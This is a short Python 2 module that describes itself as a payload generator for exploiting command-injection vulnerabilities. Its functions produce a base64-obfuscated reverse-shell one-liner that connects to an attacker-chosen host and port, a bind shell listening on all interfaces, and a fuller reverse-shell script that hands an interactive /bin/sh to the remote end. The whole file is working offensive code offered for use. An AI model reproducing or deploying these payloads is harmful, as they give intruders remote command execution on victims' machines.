#!/usr/bin/python
"""This module simply is a payload generator. It produces payloads in python"""

def reverse_oneline(lhost, lport):
    """This function generates a python reverse shell to use while exploiting command injection vulnerabilities"""
    shellcode = """import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('%s',%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(['/bin/sh','-i']);""" %(lhost, lport)
    encoded = shellcode.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '')
    wrapper =  """python -c "exec('""" + encoded + """'.decode('base64'))";"""
    payload = wrapper
    return payload

def bind_oneline(lport):
    """This function generates a python bind shell to use while exploiting command injection vulnerabilies"""
    shellcode = """import subprocess, socket; s = socket.socket(); s.bind(('0.0.0.0', %s)); s.listen(5); conn, addr = s.accept(); subprocess.Popen('/bin/sh', shell=True, stdin=conn, stdout=conn, stderr=conn, close_fds=True)""" %(lport)
    encoded = shellcode.encode('base64')
    encoded = encoded.strip()
    encoded = encoded.replace('\n', '')
    wrapper =  """python -c "exec('""" + encoded + """'.decode('base64'))";"""
    payload = wrapper
    return payload

def reverse_script(lhost, lport):
    shellcode = \
    """
import sys, socket, os, subprocess

host = '%s'
port = %s

socket.setdefaulttimeout(60)
sok = None
try:
    sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sok.connect((host,port))
    sok.send('g0tsh3ll!') 
    save = [ os.dup(i) for i in range(0,3) ]
    os.dup2(sok.fileno(),0)
    os.dup2(sok.fileno(),1)
    os.dup2(sok.fileno(),2)
    shell = subprocess.call(["/bin/sh","-i"])
    [ os.dup2(save[i],i) for i in range(0,3)]
    [ os.close(save[i]) for i in range(0,3)]
    os.close(sok.fileno())
except Exception:
    pass

        """ % (lhost, lport)
    payload = shellcode
    return payload
